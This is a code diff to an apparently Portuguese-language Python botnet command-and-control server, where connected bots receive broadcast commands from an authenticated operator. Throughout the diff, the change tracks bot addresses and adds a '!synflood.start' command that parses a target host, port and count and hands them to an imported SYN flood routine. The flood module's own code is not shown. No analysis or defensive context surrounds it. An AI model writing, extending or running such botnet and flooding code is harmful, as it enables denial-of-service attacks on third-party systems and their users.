@@ -1,4 +1,5 @@
 from socket import AF_INET, socket, SOCK_STREAM
+from server_modules import synflood
 from threading import Thread
 
 clients = {}
@@ -19,13 +20,13 @@ def accept_incoming_connections():
     while True:
         client, client_address = SERVER.accept()
         print("%s:%s has connected." % client_address)
-        addresses[client] = client_address
-        Thread(target=handle_client, args=(client,)).start()
+        Thread(target=handle_client, args=(client,client_address)).start()
 
-def handle_client(client):
+def handle_client(client,client_address):
 
     name = client.recv(BUFSIZ).decode("utf8")
     clients[client] = name
+    addresses[client_address] = name
 
     while True:
         try:
@@ -42,6 +43,19 @@ def handle_client(client):
             if user == user_required and password == pass_required:
                 if message == "!bots":
                     client.send(bytes("{} bots ativos!".format(len(clients)-1), "utf8"))
+
+                elif "!synflood.start" in message:
+                    options = message.split(' ')
+                    addr    = options[1].split(':')
+                    target  = addr[0]
+                    port    = addr[1]
+                    
+                    try:
+                        count = addr[2]
+                    except:
+                        count = 0
+                    synflood.flood(target,addresses,user_required,port,count)
+
                 else:
                     print("Comando recebido! Enviando aos bots!\n")
                     broadcast(message)
